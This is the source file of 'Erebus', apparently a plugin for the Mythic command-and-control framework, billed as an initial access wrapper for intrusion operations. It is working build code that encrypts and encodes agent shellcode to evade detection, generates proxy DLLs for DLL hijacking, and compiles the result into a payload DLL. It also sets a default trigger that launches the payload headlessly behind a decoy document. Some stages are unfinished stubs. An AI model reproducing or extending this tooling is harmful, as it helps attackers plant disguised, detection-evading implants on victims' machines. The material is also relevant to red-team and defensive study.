'''
- Author: Lavender-exe // Whispergate
- Title: Erebus
- Description: Initial Access Wrapper

TODO:
- Containers
    - MSI/X Payload Containers
        -   https://github.com/TrevorHamm/msilib (Only supports python13)
    - 7zip/Winzip Containers
        -   https://pypi.org/project/py7zr/

'''
from erebus_wrapper.erebus.modules.payload_dll_proxy import generate_proxies
from erebus_wrapper.erebus.modules.payload_obfuscate_shellcode import SHELLCRYPT, SHELLCODE_DIR
from erebus_wrapper.erebus.modules.container_clickonce import build_clickonce
from erebus_wrapper.erebus.modules.container_msi import build_msi

from mythic_container.PayloadBuilder import *
from mythic_container.MythicCommandBase import *
from mythic_container.MythicRPC import *

from pathlib import PurePath
from distutils.dir_util import copy_tree
from jinja2 import Environment, FileSystemLoader
import os
import asyncio
import tempfile


ENCRYPTION_METHODS = {
    "AES128_CBC" :  "aes_128",
    "AES256_CBC" :  "aes_cbc",
    "AES256_ECB" :  "aes_ecb",
    "CHACHA20"   :  "chacha20",
    "RC4"        :  "rc4",
    "SALSA20"    :  "salsa20",
    "XOR"        :  "xor",
    "XOR_COMPLEX":  "xor_complex",
}

COMPRESSION_METHODS = {
    "LZNT1": "lznt",
    "RLE"  : "rle",
    "NONE" : ""
}

ENCODING_METHODS = {
    "ALPHA32" : "alpha",
    "ASCII85" : "ascii85",
    "BASE64"  : "base64",
    "WORDS256": "words",
    "NONE"    : ""
}

SHELLCODE_FORMAT = {
    "C"          : "c",
    "CSharp"     : "csharp",
    "Nim"        : "nim",
    "Go"         : "go",
    "Python"     : "py",
    "Powershell" : "ps1",
    "VBA"        : "vba",
    "VBScript"   : "vbs",
    "Rust"       : "rust",
    "JavaScript" : "js",
    "Zig"        : "zig",
    "Raw"        : "raw",
}

FINAL_PAYLOAD_EXTENSIONS = [
    "exe",
    "dll",
    "7z",
    "zip",
    "tar",
    "tar.gz",
    "bin",
]


class ErebusWrapper(PayloadType):
    name = "erebus_wrapper"
    file_extension = "zip"
    author = "@Lavender-exe"
    note = """Erebus is a modern initial access wrapper aimed at decreasing the development to deployment time, when preparing for intrusion operations.
Erebus comes with multiple techniques out of the box to craft complex chains, and assist in bypassing the toughest security measures."""
    supported_os = [
        SupportedOS.Windows
        # SupportedOS.Linux, Not Supported Yet
    ]

    wrapper = True
    wrapped_payloads = []

    supports_dynamic_loading = True
    c2_profiles = []

    agent_type = AgentType.Wrapper
    agent_path = PurePath(".") / "erebus_wrapper"
    agent_icon_path = agent_path / "Erebus.svg"
    agent_code_path = agent_path / "agent_code"

    build_parameters = [
    #     BuildParameter(
    #         name = "Architecture",
    #         parameter_type = BuildParameterType.ChooseOne,
    #         description = "Select Architecture.",
    #         choices = ["x64", "x86"],
    #         default_value = "x64",
    #         hide_conditions = [
    #             HideCondition(name="Shellcode Format", operand=HideConditionOperand.EQ, value="Raw")
    #         ]
    #     ),

        BuildParameter(
            name = "DLL Hijacking",
            parameter_type = BuildParameterType.File,
            description = """Prepares a given DLL for proxy-based hijacking.
NOTE: Shellcode Format must be set to C.
NOTE: Only supports XOR for now.
NOTE: Does not (currently) support encoded or compressed payloads.
""",
            hide_conditions = [
                HideCondition(name="Shellcode Format", operand=HideConditionOperand.NotEQ, value="C"),
            ]
        ),

        BuildParameter(
            name = "Trigger Command",
            parameter_type = BuildParameterType.String,
            description = "Choose a command to run when the trigger is executed.",
            default_value = "C:\\Windows\\System32\\conhost.exe --headless cmd.exe /Q /c payload.exe | decoy.pdf",
            hide_conditions = [
                HideCondition(name="Shellcode Format", operand=HideConditionOperand.EQ, value="Raw")
            ]
        ),

        BuildParameter(
            name = "Decoy File",
            parameter_type = BuildParameterType.File,
            description = """Upload a decoy file (PDF/XLSX/etc.).
            If one is not uploaded then an example file will be used.""",
            hide_conditions = [
                HideCondition(name="Shellcode Format", operand=HideConditionOperand.EQ, value="Raw")
            ]
        ),

        # Shellcrypt
        BuildParameter(
            name = "Compression Type",
            parameter_type = BuildParameterType.ChooseOne,
            description = "Choose a compression type for the shellcode.",
            choices = [
                "LZNT1",
                "RLE",
                "NONE",
            ],
            default_value="NONE"
        ),

        BuildParameter(
            name = "Encryption Type",
            parameter_type = BuildParameterType.ChooseOne,
            description = "Choose an encryption type for the shellcode.",
            choices = [
                "AES128_CBC",
                "AES256_CBC",
                "AES256_ECB",
                "CHACHA20",
                "SALSA20",
                "XOR",
                "XOR_COMPLEX",
            ],
            default_value = "XOR"
        ),

        BuildParameter(
            name = "Encryption Key",
            parameter_type = BuildParameterType.String,
            description = """Choose an encryption key. A random one will be
            generated if none have been entered.""",
            default_value="NONE"
        ),

        BuildParameter(
            name = "Encoding Type",
            parameter_type = BuildParameterType.ChooseOne,
            description = "Choose an encoding type for the shellcode.",
            choices = [
                "ALPHA32",
                "ASCII85",
                "BASE64",
                "WORDS256",
                "NONE",
            ],
            default_value="NONE"
        ),

        BuildParameter(
            name = "Shellcode Format",
            parameter_type = BuildParameterType.ChooseOne,
            description = "Choose a format for the obfuscated shellcode.",
            choices = [
                "C",
                "CSharp",
                "Nim",
                "Go",
                "Python",
                "Powershell",
                "VBA",
                "VBScript",
                "Rust",
                "JavaScript",
                "Zig",
                "Raw",
            ],
            default_value = "C",
            required = True,
        ),

        BuildParameter(
            name = "Shellcode Array Name",
            parameter_type = BuildParameterType.String,
            description = "Choose a name for the generated shellcode array. E.g. [array name] --> sh3llc0d3[113]...",
            default_value = "shellcode",
            hide_conditions = [
                HideCondition(name="Shellcode Format", operand=HideConditionOperand.EQ, value="Raw")
            ]
        )

        # ProtectMyTooling
        # BuildParameter(

        # ),

        # LNK
        # BuildParameter(

        # ),

        # PackMyPayload
        # BuildParameter(

        # ),
    ]

    build_steps = [
        BuildStep(step_name = "Gathering Files",
                  step_description = "Copy files to temporary location"),

        BuildStep(step_name = "Header Check",
                  step_description = "Check file for MZ Header"),

        BuildStep(step_name = "Shellcode Obfuscation",
                  step_description = "Obfuscating shellcode based on selected options"),

        BuildStep(step_name = "Gathering DLL Exports for Hijacking",
                  step_description = "Extracts exports from the uploaded DLL to be used for proxying"),

        BuildStep(step_name = "Compiling DLL Payload",
                  step_description = "Compiling DLL Payload with Hijacked Info & Obfuscated Shellcode"),

        BuildStep(step_name = "Adding Trigger",
                  step_description = "Creating trigger to execute given payload"),

        BuildStep(step_name = "Creating Decoy",
                  step_description= "Creating a placeholder decoy file"),

        BuildStep(step_name = "Containerising",
                  step_description = "Adding payload into chosen container"),
    ]

    async def prepare_dllproxy(self, dll_target, shellcode: str):
        """Prepare DLL Template with proxied functions and shellcode

        Args:
            dll_target (UUID): Uploaded DLL File to Proxy
            shellcode (str): Shellcode

        Raises:
            Exception: Unknown File Error
        """
        file_content = await SendMythicRPCFileGetContent(MythicRPCFileGetContentMessage(
            AgentFileID=dll_target
        ))

        if not file_content.Success:
            raise Exception(f"[-] Failed to get file content: {file_content.Error}")

        pragmas = generate_proxies(file_content.Content)
        return pragmas

    def generate_payload(self):
        """Creates a payload based on the provided shellcode/agent

        Raises:
            NotImplementedError: Function not implemented yet.

        TODO:
            - Take in payload.
            - Check that it is in shellcode format (File Header Check).
            - Add different techniques to build payload:
                - AppDomain Injection (Local and Remote)
                - ClickOnce (Local and Remote)
                - MSI + MST
                - MSIX (Unsigned and Signed)
        """
        raise NotImplementedError

    def create_triggers(self):
        """Creates a trigger to execute the payload

        Raises:
            NotImplementedError: Function not implemented yet.

        TODO:
            - LNK Trigger
            - LOLBIN Trigger
            - MSI/MST Trigger
            - ClickOnce Trigger
        """
        raise NotImplementedError

    def containerise_payload(self):
        """Creates a container and adds all files generated from the payload function inside of the given archive/media

        Raises:
            NotImplementedError: Function not implemented yet.

        TODO:
            - 7z Compression
            - ZIP Compression
            - ISO Container
        """
        raise NotImplementedError

    async def build(self) -> BuildResponse:
        response = BuildResponse(status = BuildStatus.Error)
        output = ""

        # Debug
        # print(f"[!] Agent Path: {self.agent_path}\n[!] Agent Code Path: {self.agent_code_path}")

        try:
            agent_build_path = tempfile.TemporaryDirectory(suffix = self.uuid).name
            copy_tree(str(self.agent_code_path), agent_build_path)

            mythic_shellcode_path = PurePath(agent_build_path) / "shellcode" / "payload.bin"
            mythic_shellcode_path = str(mythic_shellcode_path)

            obfuscated_shellcode_path = PurePath(agent_build_path) / "shellcode" / "obfuscated.bin"
            obfuscated_shellcode_path = str(obfuscated_shellcode_path)

            shellcrypt_path = PurePath(agent_build_path) / "shellcrypt" / "shellcrypt.py"
            shellcrypt_path = str(shellcrypt_path)

            payload_path = PurePath(agent_build_path) / "payload"
            payload_path = str(payload_path)

            templates_path = PurePath(agent_build_path) / "templates"
            templates_path = str(templates_path)

            environment = Environment(loader=FileSystemLoader(templates_path))

            with open(mythic_shellcode_path, "wb") as file:
                file.write(self.wrapped_payload)

            if os.stat(mythic_shellcode_path) == 0:
                response.status = BuildStatus.Error
                response.build_stderr = "Failed to write Mythic Shellcode to placeholder file."
                await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
                        PayloadUUID=self.uuid,
                        StepName="Gathering Files",
                        StepStdout="Failed to write Mythic Shellcode to placeholder file.",
                        StepSuccess=False
                    ))
                return response

            response.status = BuildStatus.Success
            response.build_message = "Files Gathered for Modification."
            await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
                PayloadUUID = self.uuid,
                StepName = "Gathering Files",
                StepStdout = "Gathered files to obfuscate shellcode",
                StepSuccess = True
            ))

            with open(str(mythic_shellcode_path), "rb") as f:
                header = f.read(2)
                if header == b"\x4d\x5a":
                    response.build_stderr = "Supplied payload is a PE instead of raw shellcode."
                    await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
                        PayloadUUID=self.uuid,
                        StepName="Header Check",
                        StepStdout="Found leading MZ header - supplied file was not shellcode",
                        StepSuccess=False
                    ))
                    return response
            await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
                PayloadUUID=self.uuid,
                StepName="Header Check",
                StepStdout="No leading MZ header found in payload",
                StepSuccess=True
            ))
            response.status = BuildStatus.Success
            response.build_message = "No leading MZ header found in payload."

            cmd = [
                "/venv/bin/python3", shellcrypt_path,
                "-i", mythic_shellcode_path,
                "-e", ENCRYPTION_METHODS[self.get_parameter("Encryption Type")],
                "-f", SHELLCODE_FORMAT[self.get_parameter("Shellcode Format")],
            ]
            if self.get_parameter("Shellcode Format") != "Raw":
                cmd += ["-a", self.get_parameter("Shellcode Array Name")]

            if self.get_parameter("Compression Type") != "NONE":
                cmd += ["-c", COMPRESSION_METHODS[self.get_parameter("Compression Type")]]

            if self.get_parameter("Encoding Type") != "NONE":
                cmd += ["-d", ENCODING_METHODS[self.get_parameter("Encoding Type")]]

            if self.get_parameter("Encryption Key") != "NONE":
                cmd += ["-k", self.get_parameter("Encryption Key")]

            cmd += ["-o", obfuscated_shellcode_path]

            proc = await asyncio.create_subprocess_exec(
                *cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )
            stdout, stderr = await proc.communicate()

            if stdout:
                output += f"[stdout]\n{stdout.decode()}"
            if stderr:
                output += f"[stderr]\n{stderr.decode()}"

            if os.path.exists(obfuscated_shellcode_path):
                if self.get_parameter("Shellcode Format") == "Raw":
                    # Remove this line to continue to the next exec cycle (Triggers, Containers, etc.)
                    response.payload = open(obfuscated_shellcode_path, "rb").read()
                    response.status = BuildStatus.Success
                    response.build_message = "Shellcode Generated!"
                    await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
                        PayloadUUID=self.uuid,
                        StepName="Shellcode Obfuscation",
                        StepStdout="Obfuscating Shellcode - Outputting as Raw Binary",
                        StepSuccess=True,
                    ))
                else:
                    response.status = BuildStatus.Success
                    response.build_message = "Shellcode Generated!"
                    await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
                        PayloadUUID=self.uuid,
                        StepName="Shellcode Obfuscation",
                        StepStdout="Obfuscating Shellcode - Continuing to Next Step",
                        StepSuccess=True,
                    ))
            elif proc.returncode != 0:
                response.payload = b""
                await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
                    PayloadUUID=self.uuid,
                    StepName="Shellcode Obfuscation",
                    StepStdout="Failed to obfuscate shellcode",
                    StepSuccess=False,
                ))
                response.build_message = "Failed to obfuscate shellcode."
                response.build_stderr = output + "\n" + obfuscated_shellcode_path
                return response
            else:
                response.payload = b""
                await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
                    PayloadUUID=self.uuid,
                    StepName="Shellcode Obfuscation",
                    StepStdout="Failed to obfuscate shellcode",
                    StepSuccess=False,
                ))
                response.build_message = "Failed to obfuscate shellcode."
                response.build_stderr = output + "\n" + obfuscated_shellcode_path
                return response

            pragmas = await self.prepare_dllproxy(dll_target=self.get_parameter("DLL Hijacking"),
                shellcode=obfuscated_shellcode_path)

            dll_placeholder = {
                "PRAGMAS": pragmas,
                "SHELLCODE": obfuscated_shellcode_path
            }

            dll_template = environment.get_template("dll_template.cpp")
            file_content = dll_template.render(**dll_placeholder)
            with open(f"{dll_template}", "w") as file:
                file.write(file_content)

            # Check if the file size stayed the same as the template
            if os.stat(f"{templates_path}/dll_template.cpp")[6] == 1598:
                response.status = BuildStatus.Error
                response.build_message = "Failed to proxy the given file."
                await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
                    PayloadUUID=self.uuid,
                    StepName="Gathering DLL Exports for Hijacking",
                    StepStdout="Failed to proxy the given file.",
                    StepSuccess=False,
                ))
                return response
            else:
                # Debugging
                response.payload = open(f"{templates_path}/dll_template.cpp", "rb").read()

                response.status = BuildStatus.Success
                response.build_message = "DLL Proxied! Compiling Payload..."
                await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
                    PayloadUUID=self.uuid,
                    StepName="Gathering DLL Exports for Hijacking",
                    StepStdout="DLL Proxied! Compiling Payload...",
                    StepSuccess=True,
                ))
                return response


            # Compile as proxy'd dll name

            cmd = [
                "x86_64-w64-mingw32-gcc-win32", "-o", f"{payload_path}/payload.dll", f"{templates_path}/dll_template.cpp",
                "-shared", "-D_DLL", "-Wall", "-w", "-s", "-IInclude"
            ]

            proc = await asyncio.create_subprocess_exec(
                *cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )
            stdout, stderr = await proc.communicate()

            if stdout:
                output += f"[stdout]\n{stdout.decode()}"
            if stderr:
                output += f"[stderr]\n{stderr.decode()}"

            if os.path.exists(f"{payload_path}/payload.dll"):
                response.status = BuildStatus.Success
                response.build_message = "DLL Compiled!"
                await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
                    PayloadUUID=self.uuid,
                    StepName="Compiling DLL Payload",
                    StepStdout="DLL Proxied! Compiling Payload...",
                    StepSuccess=True,
                ))
            else:
                response.status = BuildStatus.Error
                response.build_message = "Failed to compile DLL"
                await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
                    PayloadUUID=self.uuid,
                    StepName="Compiling DLL Payload",
                    StepStdout="Failed to Compile DLL Payload",
                    StepSuccess=True,
                ))
                return response
        except Exception as e:
            response.payload = b""
            response.status = BuildStatus.Error
            response.build_message = f"Error building payload: {str(e)}\n{output}"
            return response
        return response
